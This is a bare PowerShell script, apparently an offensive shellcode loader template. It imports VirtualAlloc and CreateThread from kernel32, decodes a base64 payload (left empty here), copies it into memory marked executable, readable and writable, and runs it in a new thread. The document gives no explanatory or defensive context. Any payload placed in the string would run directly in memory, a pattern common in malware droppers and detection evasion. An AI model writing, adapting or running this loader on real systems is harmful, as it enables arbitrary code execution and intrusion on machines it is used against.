$Signature = @"
[DllImport("kernel32.dll")]
public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
[DllImport("kernel32.dll")]
public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
"@

$WinObj = Add-Type -memberDefinition $Signature -Name "Win32" -namespace Win32Functions -passthru

[byte[]] $bytes = [System.Convert]::FromBase64String("")

$WinMem = $WinObj::VirtualAlloc(0,[Math]::Max($bytes.Length,0x1000),0x3000,0x40)

[System.Runtime.InteropServices.Marshal]::Copy($bytes,0,$WinMem,$bytes.Length)

$WinObj::CreateThread(0,0,$WinMem,0,0,0)